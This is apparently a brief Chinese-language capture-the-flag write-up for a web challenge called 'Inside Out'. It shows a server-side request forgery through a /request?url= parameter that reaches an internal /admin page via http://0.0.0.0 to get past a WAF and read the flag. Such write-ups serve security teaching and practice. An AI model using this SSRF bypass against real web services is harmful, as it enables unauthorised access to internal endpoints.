# Inside Out

SSRF，`/request`可以SSRF，f12发现有`/admin`，用SSRF绕一下waf就可以访问得到flag：

```
https://web-inside-out-b3d9f3b9.chal-2021.duc.tf/request?url=http://0.0.0.0/admin
```

